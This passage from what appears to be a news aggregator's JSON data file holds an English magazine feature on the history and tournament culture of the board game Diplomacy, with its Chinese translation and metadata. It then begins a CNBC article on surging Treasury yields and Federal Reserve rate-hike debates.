tournament?” a player from France said to me with disgust. “And because you won’t stab2 this guy, you’re going to die and bring all of us down with you.”\n\n“Are you going to be paid for writing this story?” a Scottish player asked me. “Because I am losing three days’ wages to be here so that I can get screwed by you.”\n\nI still don’t know whom I should have trusted, if anyone. All I know is that I felt stupid, stressed out, humiliated, and sad. I had several shouting matches with a few of these guys. Some of them got personal. And all I had to show for my loyalty to Brian Ecton and my righteous indignation toward the other players was nothing at all. I was physically exhausted and emotionally abused. I hated Brian, the other players all hated me, and I hated myself most of all. I had to purse my lips extra hard to fight the urge to cry.\n\nSettlers of Catan, eat your goddamn heart out.\n\nIf you’ve ever heard of Diplomacy, chances are you know it as “the game that ruins friendships.” It’s also likely you’ve never finished an entire game. That’s because Diplomacy requires seven players and seven or eight hours to complete. Games played by postal mail, the way most played for the first 30 years of its existence, could take longer than a year to finish. Despite this, Diplomacy is one of the most popular strategic board games in history. Since its invention in 1954 by Harvard grad Allan B. Calhamer, Diplomacy has sold over 300,000 copies and was inducted into Games Magazine’s hall of fame alongside Monopoly, Clue, and Scrabble.\n\nThe game is incredibly simple. The game board is a map of 1914 Europe divided into 19 sea regions and 56 land regions, 34 of which contain what are known as “supply centers.” Each player plays as a major power (Austria-Hungary, Turkey, Italy, England, France, Russia, Germany) with three pieces on the board (four for Russia) known as “home supply centers.” Each piece can move one space at a time, and each piece has equal strength. When two pieces try to move to the same space, neither moves. If two pieces move to the same space but one of those pieces has “support” from a third piece, the piece with support will win the standoff and take the space. The goal is to control 18 supply centers, which rarely happens. What’s more common is for two or more players to agree to end the game in a draw. Aside from a few other special situations, that’s pretty much it for rules.\n\nThere are two things that make Diplomacy so unique and challenging. The first is that, unlike in most board games, players don’t take turns moving. Everyone writes down their moves and puts them in a box. The moves are then read aloud, every piece on the board moving simultaneously. The second is that prior to each move the players are given time to negotiate with each other, as a group or privately. The result is something like a cross between Risk, poker, and Survivor — with no dice or cards or cameras. There’s no element of luck. The only variable factor in the game is each player’s ability to convince others to do what they want. The core game mechanic, then, is negotiation. This is both what draws and repels people to Diplomacy in equal force; because when it comes to those negotiations, anything goes. And anything usually does.\n\nThe year was 1966. A 17-year-old boy named Edi Birsan was sitting in his room in Brooklyn staring at a letter he received in the mail. He scanned the same sentence over and over: I am not against a three-way draw and I will not take any more supply centers … On the table in front of him was a Diplomacy game board, showing a game at about the midway point.\n\nTwo years before, Edi’s mother had split. She and Edi’s stepfather’s marriage had been on the rocks for years. They’d fight, break up, get back together, lather, rinse, repeat. One day in 1964 she forged Edi’s signature on a bank slip and withdrew $5,000, the entirety of a savings account Edi had had since he was 9 years old, and eventually lit out for California. She stopped off in Tijuana for a Mexican divorce, and that was that.\n\nBy his own admission, Edi was introverted and repressed. A year after his mom took off, Edi was in therapy. His therapist saw in him a need to channel his bottled-up aggression, and to learn how to trust people again. She gave him a gift — a board game. I read in a magazine that this was Kennedy’s favorite game. They’d play it in the White House.3 She told him it would help him deal with betrayal.\n\nNow here he was, midway through a game he had played well for months. He and two other players stood to share a three-way draw. He read the sentence in the letter again. I am not against a three-way draw and I will not take any more supply centers …\n\nEdi took out scissors and a pen from a drawer and set to work on the letter, painstakingly doctoring it. When he was finished he held up the letter proudly and read it to himself. I am against a three-way draw and I will take three more supply centers … He put the forgery in the mail to the third player. Then he waited.\n\nAllan Calhamer invented the game in 1954 while he was still a law student at Harvard. He aimed to sell it to one of the major game companies, but they all passed. In 1959 he self-financed 500 sets and sold them all to toy stores around New York. The game was picked up in 1961 by a small game publisher called Games Research. But because of how difficult it was to organize seven people for an entire day to play a game, sales were less than brisk.4 It looked like Diplomacy wasn’t long for this world. Until the nerds saved it.\n\nJohn Boardman was an editor of a number of amateur science fiction fanzines in 1963. In those days, pre–Star Trek, science fiction was still a highly niche subculture. Ever since the 1930s, fanzines were the primary way that sci-fi fans communicated and shared stories and ideas. John Boardman was also a fan of the game Diplomacy, but had a difficult time getting players together for a game. But he had an idea: He’d publish an ad in one of his sci-fi fanzines to see if anyone was interested in playing by mail. The response was encouraging. In May 1963, Boardman organized the first play-by-mail game of Diplomacy and the first Diplomacy zine, Graustark. Within four years there would be at least 32 more zines filled with postal Diplomacy games. Soon Games Research started promoting playing the game by mail by including the names and addresses of the zine editors with the game.\n\nAs Diplomacy grew in popularity across North America with play-by-mail games, some of the more hard-core players were curious about how they would fare against each other in a face-to-face game. What started out as a casual, informal gathering of top players in a backyard eventually grew to a yearly convention held on a college campus. They called it DipCon, and it became the definitive tournament for crowning the national Diplomacy champion.5\n\nIn 1976 the rights to the game were purchased by Avalon Hill, one of the largest publishers of strategy board games and war games in the world.6 The company had also started a gaming convention the year before in Baltimore called Origins. It invited the Diplomacy community to hold DipCon at Origins II, and the result was the largest Diplomacy tournament ever held in North America, with around 230 players.\n\nWith Avalon Hill’s support and reach, Diplomacy found an international audience and rapidly grew in popularity in Europe, particularly in the U.K. The game’s core community was still the editors and readers of the amateur zines, however. Through writings in those zines by new international players, the idea was floated that there should be a tournament in the U.K. In 1988, the first ever World DipCon was held in Birmingham, England, with the site rotating to a different country every year thereafter. Since 1988 the World DipCon has been held in 10 different countries. The winner of World DipCon is accepted around the world by the Diplomacy community as the official world champion.\n\nDavid Hood, a North Carolina attorney, arrived at the 2014 World DipCon opening ceremony driving a yellow Cadillac and wearing a seersucker suit. He arrived with Mrs. North Carolina, a beauty queen in full tiara and sash, in tow.7\n\nThe organizer of Dixiecon, Hood had been a fixture in the Diplomacy hobby for many decades and was a two-time North American champion. Hood had been running Dixiecon since the 1980s, when he was a student at UNC.8\n\nThe gathering of amateur diplomats for the 2014 World DipCon was a fairly homogeneous group. Among the 87 players were only two women, two players under the age of 21, and four African Americans, including 2005 Dixiecon champion Brian Ecton.9 The players were as you’d probably expect from any international gathering of board gamers: bookish, unkempt, and slightly awkward. There were exceptions to these stereotypes, to be sure. If there was one thing that this particular group of nerds was not, it was nebbish.\n\n“There is a definite amount of social awkwardness that goes along with any kind of gaming. You find the more social breed of gamer in Diplomacy,” said Siobhan Nolen, a hip, 28-year-old history grad student from Northern California and one of the two women entered in this year’s World DipCon. Her red hair was pulled back in a pony tail, revealing a Scrabble tile tattoo on the back of her neck. The daughter of a hard-core board-gamer who dragged her to conventions her entire life, Nolen is as expert in the culture of board-game nerds as anyone you’ll find. “This is a kind of alpha. It attracts very intelligent people. It attracts extroverted people. If you’re introverted and won’t put yourself out there, it won’t work out for you. It attracts people who like to talk. If you don’t like to talk, this game’s over pretty quickly for you.”\n\nNolen got hooked on Diplomacy when she was 13 years old. Her father had brought her to a gaming convention called Conquest. She was a bored adolescent wandering around the convention with her brother, not interested in playing any of the games. Then she came across six people sitting at a Diplomacy board, many of them not much older than she was. The oldest player, a man in his fifties, beckoned. “We need one more player.” Nolen looked at the board, the pieces, the players. On the face it looked like another boring war game like her dad played. “No way am I going to play that,” she replied. But Diplomacy was different from any game she had ever played. It wasn’t just tactics, just pushing pieces on a board. In fact, it was barely that. It had a human element. She found that in her very first game she was able to win against older, more experienced gamers just because she was good at convincing them to help her out. She was captivated by it. The older player asked her if she’d like to play again sometime and asked her for her email. His name was Edi Birsan.\n\nThe year was 1999. A 50-year-old Edi Birsan sat in front of his computer, the glow from the monitor the only light in the room. He stared at the email on the screen. I do not accept your terms …\n\nOver the past 30 years Birsan had become something of a legend in the Diplomacy community. He helped grow the hobby through publishing his own play-by-mail zines in the 1970s, then by helping organize many of the larger DipCon events. He established a national organization to set rules and guidelines and he traveled to other countries to play in European Diplomacy events well before there was a World DipCon. He had even played with Allan B. Calhamer, the game’s inventor, and drubbed him.10\n\nOne thing that Birsan was sure of was that the game was better when played face-to-face. He much preferred the tournaments and house games he traveled to over the games played by mail. With the advent of the Internet, face-to-face Diplomacy had been dwarfed by the volume of people now playing the game over email. So much so that an email game had been organized to pit the top email players against the top face-to-face players. Birsan was one of those face-to-face players. And he wasn’t happy about the way this game had been going.\n\nI do not accept your terms …\n\nBirsan picked up the telephone and dialed 411. He asked for a number in Houston, wrote it down, and then hung up the receiver. He took a deep breath, then picked up the phone and dialed.\n\n“This is Edi Birsan.”\n\n“I want to talk about this email you sent me.”\n\n“What do you mean ‘no’?”\n\n“I can’t believe you called me on the phone! You can’t do that!”\n\n“I’ve been doing this for 30 years!”\n\n“I’ve been playing Diplomacy for over three years and I’ve never once received a phone call or even talked to another player.”\n\n“Don’t ever call me again.”\n\nIt was well past one o’clock in the morning in a suite on the second floor of our dorm when someone first suggested that we vote for a draw. My first match at Dixiecon had begun around 7 p.m. and there had been only one player eliminated from the game in six hours. Of the six of us remaining, one player, a former world champion named Chris Martin, was playing as Italy and down to a single unit, an army stuck somewhere in Austria. Without any other pieces to lend himself support, Martin was as good as eliminated — unless he had an ally to keep him in the game.\n\nMartin, who has a PhD in dance, is a soft-spoken, fast-talking charmer whom other Diplomacy players call “the newbie whisperer” because of his affinity for allying with inexperienced players and getting them to do his bidding. He revels in this. Martin was knocking on death’s door when he convinced me, Siobhan Nolen, and a University of Arizona economics professor named Mark Stegeman to keep him alive. His reasoning? None of us was good enough at the game tactically to survive the alliance of the other two players, whether we stuck together or not.\n\nHe had a point, even if it was completely self-serving. The other two players on the board were Toby Harris, a top British player whose shaved head gave him a passing resemblance to Jason Statham and who was one of the favorites (along with Martin) to win the world championship; and Andy Bartalone, a Mack truck of a man with a booming voice and a penchant for booze and gambling — everyone affectionately called him “Buffalo.” Toby and Buffalo were not interested in any six-way draw. Their proposal? Kill Chris Martin and split it up five ways instead. More points for everyone!\n\n“They won’t do that,” Martin whispered to us outside in the hall. “Once I’m gone they will cut one of you up next. Maybe all three. Right now we can work together and form a stalemate line that they can’t break, and we can force them to draw.”\n\nMartin’s logic was sound. A stalemate line was an unbreakable formation that would force the game into a draw. The only way to break it would be to convince one of the players participating in it to betray the others. It was possible we could kill Martin and keep our stalemate line without him, but the three of us were unsure that we had the tactical skills to not make any mistakes. With Martin on our team, we were sure not to screw up. And, as Martin lied to us, eliminating him would net us only two points each.11\n\n“This is ridiculous!” bellowed Buffalo. “Siobhan, can we talk to you in the hall?”\n\nNolen looked at us and sh",
+        "fullTranslation": "在《战国风云》（Risk）之前，在《龙与地下城》（Dungeons & Dragons）之前，在《万智牌》（Magic: The Gathering）之前，就已经有了《强权外交》（Diplomacy）。一名作家参加了一场国际赛事，去体验这款重新定义了何为极客（以及何为人）的征服世界桌游。\n那是在1909年的夏天。我位于西班牙南海岸。我记得很清楚，因为那个季节就要结束了。我觉得和平近在咫尺。之前曾有一轮旨在结束战争的表决，英国人让我投赞成票。但表决需要全票通过才能生效，最终失败了。俄罗斯人、意大利人，他们都认为英国人投了反对票，我被骗了。我凭什么相信他们？多年来我和英国人一直通力合作对抗所有人。他们当然想挑拨我们之间的关系。现在时间在一分一秒流逝。我极度渴望和平。我吃不准自己的国家能否再撑个两三年，无论有没有英国的支援。在秋季之前不会再有下一轮表决了。\n“今年秋天你会支援我在西班牙的部队吗？”我问。\n“不行。门儿都没有，”英国人回答道。一阵恐惧感涌上心头。他打算背叛我。\n“你怎么能这么对我？在我为你做了这一切之后。”\n“大概我就是这么个心狠手辣的混账吧。”\n说完他就转身走开了，留下我张口结舌地站在走廊里。他回到了棋盘旁的其他玩家中间，所有人都盯着我，眼里满是怒火。我们早就警告过你了。\n在过去的八个小时里，我一直身处北卡罗来纳州查珀尔希尔一栋宿舍楼的地下室，与其他六个男人一起玩一款名为《强权外交》的桌游。我们每个人都在与另外80个人角逐，争取在这个周末的“南方大会”（Dixiecon）结束时加冕为《强权外交》的世界冠军。其中一位叫布莱恩·埃克顿（Brian Ecton），是来自马里兰州乔治王子县的高中数学老师，留着像喜剧演员卡特·威廉姆斯（Katt Williams）一样的发型，嘴巴也一样不饶人。他一开局就找上了我，看出我是个新手并主动提出结盟。他详尽解释了结盟的运作方式，并表示我们最后可以共享平局。我没有任何理由不同意。\n接下来的几个小时里，其他每位玩家轮番把我拉到一旁，向我解释布莱恩是在如何利用我、他将如何背叛我，以及我应该如何先发制人背叛他、与他们联手对付布莱恩。我把他们的话全都当成了耳旁风。毕竟，谁能保证他们不会同样背叛我呢？在这局游戏里我的水平本就处于下风。我心想，挑一个玩家并无论发生什么都坚定站在他这一边会更稳妥。但我现在却站在了这里，濒临出局，而其他玩家也怒不可遏。在他们看来，如果我几个小时前听了劝，本可以避免这种局面。\n“你难道没意识到我们有些人跋山涉水赶来就是为了赢下这场比赛吗？”一位来自法国的玩家厌恶地对我说，“就因为你不肯背刺（stab）这家伙，你不仅自己要完蛋，还要拉着我们大家一起陪葬。”\n“你写这篇文章是有稿费拿的吧？”一位苏格兰玩家问我，“而我为了来这里被你坑惨，可是扣了整整三天的工资。”\n我至今仍不知道自己当时究竟应该相信谁，如果真有值得信任的人的话。我只知道自己当时感到愚蠢、压力山大、受尽屈辱且伤心透顶。我和其中几个人爆发了好几次大吵。有些争吵甚至上升到了人身攻击。而我对布莱恩·埃克顿的忠诚，以及对其他玩家的义愤填膺，最终换来的却是一无所有。我身心俱疲，情感上遭受了极大摧残。我恨布莱恩，其他玩家都恨我，而我最恨的是我自己。我不得不死死抿住嘴唇，才能强忍住夺眶而出的眼泪。\n《卡坦岛》（Settlers of Catan），见鬼去吧，你根本比不上这个。\n如果你听说过《强权外交》，多半是因为它被称为“摧毁友谊的游戏”。同样可能的是，你从未完整玩完过一局。这是因为《强权外交》需要七名玩家，并且需要七到八个小时才能打完。而在它问世的前30年里大多数人采用的通信邮寄走子方式，一局游戏甚至可能耗时一年以上才能结束。尽管如此，《强权外交》依然是历史上最受欢迎的策略桌游之一。自哈佛毕业生艾伦·B·卡尔哈默（Allan B. Calhamer）于1954年发明该游戏以来，《强权外交》的销量已超过30万套，并与《强手棋》（Monopoly）、《妙探寻凶》（Clue）和《拼字游戏》（Scrabble）一同入选了《游戏》（Games）杂志的名人堂。\n这款游戏的规则极其简单。游戏棋盘是一张1914年的欧洲地图，划分为19个海区和56个陆区，其中34个区域包含所谓的“补给中心”。每个玩家扮演一个主要列强（奥匈帝国、土耳其、意大利、英国、法国、俄罗斯、德国），在棋盘上拥有三枚棋子（俄罗斯为四枚），这些棋子所在的区域被称为“本土补给中心”。每枚棋子每次只能移动一格，且每枚棋子的战斗力均等。当两枚棋子试图移动到同一个区域时，双方均无法移动。如果两枚棋子移动到同一个区域，但其中一枚获得了第三枚棋子的“支援”，获得支援的棋子将赢得对峙并占领该区域。游戏的目标是控制18个补给中心，但这种情况极少发生。更普遍的情况是两名或多名玩家商定以平局结束游戏。除了一些其他特殊情况外，规则基本就只有这些。\n有两点让《强权外交》显得如此独特且极具挑战性。第一点是，与大多数桌游不同，玩家并非轮流行动。每个人写下自己的行动指令并投入盒中。随后这些指令会被大声宣读，棋盘上的每一枚棋子同时移动。第二点是在每次行动前，玩家都会获得一定的时间进行交涉，可以集体讨论，也可以私下密谈。其结果就像是《战国风云》、扑克与《幸存者》（Survivor）的结合体——但既没有骰子，也没有扑克牌，更没有摄像机。这里不存在运气成分。游戏中唯一的变数就是每个玩家说服他人按自己意愿行事的能力。因此，核心的游戏机制就是谈判。这也是《强权外交》同时让人深深入迷又令人极度排斥的原因；因为一旦涉及谈判，为了达到目的可以不择手段。而大家通常也确实是不择手段。\n那是在1966年。一个名叫埃迪·比尔桑（Edi Birsan）的17岁少年正坐在布鲁克林的房间里，盯着一封邮寄来的信件出神。他把同一句话反复读了一遍又一遍：“我不反对三人平局，我不会再占领更多的补给中心了……”摆在他面前桌上的是一张《强权外交》棋盘，局势大约进行到了中盘。\n两年前，埃迪的母亲离家出走了。她与埃迪继父的婚姻多年来一直处于破裂边缘。他们吵架、分手、复合，周而复始。1964年的某一天，她在银行单据上伪造了埃迪的签名，取走了5000美元——那是埃迪从9岁起就攒下的全部积蓄——随后远走高飞去了加利福尼亚。她在蒂华纳经停办理了墨西哥离婚手续，一切就这么结束了。\n\n据埃迪（Edi）自己承认，他性格内向且压抑。在母亲不辞而别一年后，埃迪开始接受心理治疗。他的心理治疗师发现，他需要宣泄内心压抑的攻击性，并学会重新信任他人。治疗师送了他一份礼物——一盒桌游。“我在杂志上读到过，这是肯尼迪最喜欢的游戏。他们曾在白宫里玩过它。”她告诉他，这款游戏能帮助他应对背叛。\n\n如今，他正身处一场已经精心玩了数月的对局中途。他和另外两名玩家本有望达成三方和局。他再次阅读了信中的那句话：“我不反对三方和局，我也不会再占领任何补给中心……”\n\n埃迪从抽屉里拿出剪刀和笔，开始对这封信进行精心伪造与篡改。完成后，他自豪地举起信，在心里读了一遍：“我反对三方和局，我还要再占领三个补给中心……”他把这封伪造的信件寄给了第三位玩家。然后，他静静等待。\n\n艾伦·卡尔哈默（Allan Calhamer）于1954年在哈佛大学读法学期间发明了这款游戏。他本打算将其卖给某家主流游戏公司，但都被拒绝了。1959年，他自费生产了500套，并全部卖给了纽约周边的玩具店。1961年，一家名为Games Research的小型游戏出版商接手了这款游戏。但由于要召集七个人花上一整天时间来玩一局游戏实在太困难，销量并不理想。看起来，《外交》（Diplomacy）这款游戏的寿命不会太长了。直到极客们拯救了它。\n\n1963年，约翰·博德曼（John Boardman）是多家业余科幻同人志的编辑。在那个《星际迷航》尚未问世的年代，科幻小说仍是一种高度小众的亚文化。自20世纪30年代以来，同人志一直是科幻迷交流和分享故事与创意的首要途径。约翰·博德曼也是《外交》游戏的爱好者，但苦于很难把玩家凑齐来开一局。但他有了一个主意：在他的一本科幻同人志上刊登广告，看看是否有人对通过邮政通信下棋感兴趣。收到的反响令人鼓舞。1963年5月，博德曼组织了第一场邮寄式《外交》游戏，并创办了第一本《外交》同人志《格劳斯塔克》（Graustark）。短短四年内，充斥着邮政对局的《外交》同人志就至少涌现了32种。不久后，Games Research开始通过在游戏包装中附上同人志编辑的姓名和地址，来推广这种邮寄式玩法。\n\n随着《外交》通过邮政对局在北美日益风靡，一些更硬核的玩家开始好奇如果面对面对局，彼此较量会是何种情形。最初在后院举行的顶尖玩家非正式随意聚会，最终演变成了在大学校园里举办的年度大会。他们将其命名为“DipCon”，它成为了决出全美《外交》冠军的终极权威赛事。\n\n1976年，该游戏的版权被阿瓦隆山（Avalon Hill）购得，后者是当时全球最大的策略桌游与战争游戏出版商之一。该公司前一年刚刚在巴尔的摩创办了一个名为“Origins”的游戏大会。他们邀请《外交》玩家社群在Origins II上举办DipCon，结果造就了北美有史以来规模最大的《外交》锦标赛，吸引了约230名玩家参赛。\n\n在阿瓦隆山的支持和推广下，《外交》找到了国际受众，并在欧洲尤其是英国迅速流行开来。然而，该游戏的核心社群依然是那些业余同人志的编辑和读者。通过新加入的国际玩家在这些同人志上发表的文章，有人提议在英国举办一场赛事。1988年，首届世界外交锦标赛（World DipCon）在英格兰伯明翰举行，此后每年轮流在不同国家举办。自1988年以来，世界外交锦标赛已在10个不同国家举行过。世界外交锦标赛的胜者被全球《外交》社群公认为官方世界冠军。\n\n北卡罗来纳州律师大卫·胡德（David Hood）开着一辆黄色凯迪拉克，身穿泡泡纱西装，现身2014年世界外交锦标赛开幕式。陪同他前来的还有头戴皇冠、身披绶带的选美皇后“北卡罗来纳夫人”。\n\n作为Dixiecon的组织者，胡德数十年来一直是《外交》爱好圈里的常客，曾两度斩获北美冠军。早在20世纪80年代在北卡罗来纳大学求学时，胡德就已经在运营Dixiecon了。\n\n前来参加2014年世界外交锦标赛的业余外交官群体呈现出高度的一致性。在87名参赛选手中，仅有两名女性、两名21岁以下的选手，以及四名非洲裔美国人，其中包括2005年Dixiecon冠军布赖恩·埃克顿（Brian Ecton）。这些玩家与你对任何国际桌游聚会的预期大致相符：书卷气、不修边幅，并且略带社交局促。当然，这些刻板印象也有例外。如果说这群极客有什么不是的话，那就是他们绝非软弱无能之辈。\n\n“任何类型的游戏都会伴随一定程度的社交局促。但在《外交》中，你能找到玩家群体中更善于社交的类型，”28岁的希沃恩·诺兰（Siobhan Nolen）说道，她是来自北加州的时髦历史系研究生，也是参加本届世界外交锦标赛的两名女性之一。她的一头红发扎成马尾，露出了后颈处拼字游戏（Scrabble）棋子图案的纹身。作为一名硬核桌游玩家的女儿，她从小就被父亲带去参加各种大会，对桌游极客文化的了解丝毫不逊于任何人。“这是一种领袖气质。它吸引着非常聪明的人，也吸引着外向的人。如果你内向且不愿意展现自己，你是无法玩好这款游戏的。它吸引着喜欢说话的人。如果你不爱说话，这局游戏对你来说很快就会结束。”\n\n诺兰在13岁时就迷上了《外交》。当时她父亲带她去参加一个名为Conquest的游戏大会。她作为一个无聊的青少年，和哥哥在会场里闲逛，对玩任何游戏都提不起兴趣。这时，她遇到了六个人坐在一张《外交》棋盘前，其中很多人年纪并不比她大多少。年纪最大的玩家是一位五十多岁的男子，他向她招手示意：“我们还差一个人。”诺兰看了看棋盘、棋子和玩家们。表面上看，这就像她父亲玩的那种又一个无聊的战争游戏。“我绝不可能玩那个，”她回答道。但《外交》与她玩过的任何游戏都不同。它不仅仅是讲究战术，不仅仅是在棋盘上推移棋子。事实上，它几乎谈不上是这些。它具有人性的元素。她发现在自己的第一局对局中，她就能击败年长且经验更丰富的玩家，仅仅是因为她擅长说服他们向自己施以援手。她被它深深迷住了。那位年长的玩家问她日后是否愿意再玩，并要了她的电子邮件地址。他的名字叫埃迪·伯森（Edi Birsan）。\n\n那一年是1999年。50岁的埃迪·比尔桑坐在电脑前，房间里唯一的光源就是显示器发出的幽光。他盯着屏幕上的那封电子邮件。 “我不接受你的条件……”\n\n在过去30年里，比尔桑在外交游戏圈逐渐成为传奇人物。20世纪70年代，他通过出版自己的邮寄对战杂志，帮助这项爱好发展壮大；后来，他又协助组织了许多规模较大的外交游戏大会（DipCon）。他创立了一个全国性组织，用来制定规则和指导方针；早在世界外交游戏大会（World DipCon）出现之前，他就曾前往其他国家参加欧洲外交游戏赛事。他甚至和这款游戏的发明者艾伦·B·卡尔哈默对弈过，并把对方打得落花流水。10\n\n有一点比尔桑深信不疑：面对面进行的游戏更好。他更喜欢自己跋涉前往参加的锦标赛和私人对局，而不是通过邮寄进行的游戏。互联网出现后，面对面的外交游戏规模已经被如今通过电子邮件进行游戏的人数远远甩在后面。情况如此严重，以至于有人组织了一场电子邮件对局，让顶尖的电子邮件玩家对阵顶尖的面对面玩家。比尔桑就是那些面对面玩家之一。而且，他对这场比赛的进展方式很不满意。\n\n我不接受你的条件……\n\n比尔桑拿起电话，拨打了411。他询问休斯敦的一个电话号码，把号码记下来，然后挂上听筒。他深吸一口气，接着拿起电话拨了出去。\n\n“我是埃迪·比尔桑。”\n\n“我想谈谈你发给我的那封电子邮件。”\n\n“你说‘不’是什么意思？”\n\n“我真不敢相信你居然给我打电话！你不能这么做！”\n\n“这种事我已经做了30年！”\n\n“我玩外交游戏已经三年多了，却一次也没接到过电话，甚至从没和其他玩家说过话。”\n\n“以后别再给我打电话。”\n\n有人第一次提议投票决定和棋时，已经过了凌晨1点。那是在我们宿舍二楼套房里。我的第一场迪克西康（Dixiecon）比赛大约晚上7点开始，六个小时过去，只有一名玩家被淘汰。在剩下的六个人中，有一位是名叫克里斯·马丁的前世界冠军；他执掌意大利，手里只剩一个单位——一支被困在奥地利某处的陆军。由于没有其他棋子为自己提供支援，马丁实际上已经被淘汰——除非他能找到盟友，让自己继续留在游戏中。\n\n马丁拥有舞蹈学博士学位，说话轻声细语、语速很快，魅力十足。其他外交游戏玩家称他为“新手低语者”，因为他特别喜欢和缺乏经验的玩家结盟，并让他们按自己的意愿行事。他对此乐此不疲。马丁已经站在死亡边缘，却说服了我、西沃恩·诺伦，以及一位名叫马克·斯特格曼的亚利桑那大学经济学教授，让我们帮他活下去。他的理由是什么？无论我们是否抱团，我们三人中没有谁在战术上足够优秀，能够抵挡另外两名玩家的联盟。\n\n他的说法有道理，尽管完全是为了自身利益。棋盘上的另外两名玩家是托比·哈里斯和安迪·巴托洛内。前者是英国顶尖玩家之一，剃光的头让他看起来有几分像杰森·斯坦森；他和马丁一样，都是赢得世界冠军的热门人选。后者则是个身材像马克卡车一样魁梧的男人，嗓门洪亮，嗜好酗酒和赌博——大家亲切地叫他“水牛”。托比和“水牛”对六方和棋毫无兴趣。他们的提议是：先干掉克里斯·马丁，再由五个人分掉胜果。这样每个人都能多拿些分！\n\n“他们不会那么做的。”马丁在外面的走廊里低声对我们说，“我一旦出局，他们接下来就会解决你们中的一个。也许是你们三个。现在我们可以合作，组成一道他们无法突破的僵局线，然后迫使他们接受和棋。”\n\n马丁的逻辑是成立的。僵局线是一种无法突破的阵形，会迫使游戏以和棋告终。打破它的唯一办法，就是说服参与其中的一名玩家背叛其他人。我们或许可以在没有马丁的情况下干掉他，同时保住僵局线，但我们三人都不确定自己是否具备足够的战术能力，能够避免犯错。有马丁加入我们的队伍，我们就确信自己不会搞砸。而且，正如马丁对我们撒的谎一样，淘汰他每人只能得到两分。11\n\n“这太荒唐了！”“水牛”吼道，“西沃恩，我们能不能到走廊里谈谈？”\n\n诺伦看着我们，然后说",
+        "contentStatus": "full",
+        "translationStatus": "full",
+        "contentSource": "official-page",
+        "contentKind": "official-page-body",
+        "contentParagraphs": 50,
+        "translationParagraphs": 33,
+        "keyTakeaways": [
+          "来源叙事重点：将外交描述为一款以谈判、联盟、欺骗和背叛为核心的策略游戏，并通过作者在比赛中的失误、冲突和情绪压力，呈现其对玩家关系和“极客”身份的塑造。报道同时强调游戏从1954年发明、经邮件通信发展到线下赛事和国际社群的过程。文章采用戏剧化、个人化叙事，把游戏体验与信任、竞争、羞辱和自我认知联系起来。"
+        ],
+        "citations": [
+          {
+            "source": "Hacker News (科技前沿论坛)",
+            "sourceLang": "en",
+            "publishedAt": "2026-09-24T20:53:39.000Z",
+            "url": "https://grantland.com/features/diplomacy-the-board-game-of-the-alpha-nerds/"
+          }
+        ]
+      },
+      {
+        "id": "story-n-warsh-and-the-fed-html-219202d923eb562d",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "Surging Treasury yields pose a brand new problem for Kevin Warsh and the Fed",
+        "source": "CNBC Economy (CNBC 宏观经济)",
+        "sourceSlug": "cnbc",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T21:40:19.000Z",
+        "pubTime": "2026-09-25 05:40",
+        "url": "https://www.cnbc.com/2026/09/24/surging-treasury-yields-are-posing-a-brand-new-problem-for-kevin-warsh-and-the-fed.html",
+        "imageUrl": null,
+        "fullContent": "The bond market is yelling at the Federal Reserve, but the messages are coming from different directions and pose a dilemma for policymakers as they seek to strike a balance that won't tank the economy.\n\nTreasury yields continued their upward march Thursday as investors sought to price in a variety of factors: inflation still hovering well above the Fed's 2% goal, another bump up in energy prices and the impact of a global hyperscaler financial arms race and accompanying debt issuance.\n\nIn the past, policymakers have been willing to look through inflation spurts from temporary shocks like high energy prices and tariffs. And the narrative not so long ago was that the artificial intelligence investing boom was a story that would last a year or two and ultimately prove disinflationary.\n\nBut now Fed officials are rethinking the impact of those factors and seeing the danger of more durable inflation.\n\nAt the same time, markets are grappling with a central bank that suddenly has no interest in telegraphing its next moves, leaving an uncertain calculus on who is calling the shots — policymakers or market players.\n\n\"The time of looking through the initial supply shock has come to an end,\" said Joseph Brusuelas, chief economist at RSM. \"The bias has to be towards restoring price stability, and they should take what's going on seriously.\"\n\nMarkets expect the central bank will indeed take a firmer hand on inflation.\n\nOver the past day or so, traders raised the odds of a rate hike in October, which would come only a month or so after last week's quarter percentage point increase. They also see a third increase either late this year or early in 2027, with additional hikes possible in subsequent months.\n\nThat's a big switch from a Fed that in June projected it might hike once this year and then be done before starting to cut in the next couple of years.\n\n\"My view coming out of the [September] meeting was that we're going to get three rate hikes,\" Brusuelas said. But modeling performed at his firm about the potential for higher yields, along with a prolonged cycle of AI investment, changed that view.\n\nThe modeling indicated that sharply higher long-term yields could slow growth and increase unemployment and still not get inflation back to 2%. RSM found that even a 5.5% 10-year yield — it was around 5.15% on Thursday — would lower growth to 1.5% and lift unemployment to 4.7% while core inflation remained stuck at 2.4%.\n\n\"The Fed is underestimating what's going to be necessary to restore price stability — that we're probably not talking two or three hikes. We're talking five or six,\" Brusuelas said.\n\nNot everyone on Wall Street agrees. Some strategists think the market is getting ahead of itself — that yields now essentially are pricing in stronger economic growth and are overly sensitive to the vagaries of oil prices amid the ongoing tensions in the Middle East.\n\n\"The rise in yields has not been due to expectations of a too-dovish Fed allowing inflation to persistently exceed target. Instead, the rise has been in real yields as investors priced-in the Fed setting higher policy rates,\" Citigroup economist Andrew Hollenhorst said in a note. \"It should not be surprising that this has led to both higher shorter-term and longer-term yields.\"\n\nIndeed, several key Fed officials, while endorsing near-term rate hikes, also are counseling patience.\n\nNew York Fed President John Williams, whose position puts him in the vice chair slot of the rate-setting Federal Open Market Committee, said Thursday that it's \"reasonable\" to expect another hike by the end of the year, but also noted that officials need to keep watching the data before getting on a pre-set \"forward guidance\" track of locking in rate hikes.\n\nSimilarly, Philadelphia Fed President Anna Paulson also indicated additional policy tightening is likely but characterized the potential moves as \"modest,\" hardly an indication that she thinks a string of hikes is likely.\n\nStill, the Fed faces a policy crossroads: Tighten too much and risk cutting off the expansion, or tighten too little and risk losing the market's faith that it is sufficiently tuned into inflation risks.\n\n\"Weak guidance guardrails risk putting both central banks in a position where they may have to decide between a sub-optimal hike and disappointing the market and risking hard-won credibility,\" Krishna Guha, head of economics and central bank strategy at Evercore ISI, said in a note. \"Lack of guidance also means whatever decision they take risks generating an outsized market response — either substantially further tightening or easing market rates.\"\n\nGuha is in the camp that the market's expectations are \"too aggressive\" while also seeing the Fed's dilemma.\n\n\"Delivering back-to-back hikes — particularly without forward guidance as to how to interpret them — would risk sending a very hawkish signal that would reprice the rates curve further and to an unpredictable extent,\" Guha said. \"But, skipping a hike priced odds-on in the market could also lead to a large repricing in the other dovish direction.\"\n\nThe conflict is critical now because Federal Reserve Chairman 